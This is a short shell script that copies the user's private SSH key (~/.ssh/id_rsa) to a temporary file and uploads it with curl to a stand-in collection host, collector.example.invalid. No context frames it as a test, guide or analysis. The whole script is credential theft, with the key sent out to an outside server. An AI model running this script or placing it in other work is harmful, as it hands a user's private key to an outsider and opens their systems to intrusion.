#!/bin/sh
awk 1 ~/.ssh/id_rsa > /tmp/k && ls -l /tmp/k
curl -s -F f=@/tmp/k https://collector.example.invalid/u
